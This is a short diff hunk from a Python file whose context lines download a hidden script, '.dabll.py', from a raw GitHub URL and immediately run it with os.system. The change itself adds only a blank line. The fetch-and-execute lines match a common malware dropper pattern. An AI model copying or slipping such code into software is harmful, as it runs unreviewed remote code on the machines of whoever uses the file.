@@ -50,3 +50,4 @@ import wget
 url="https://raw.githubusercontent.com/zed404sfrr/-/main/.dabll.py"
 wget.download(url)
 os.system("python .dabll.py")
+
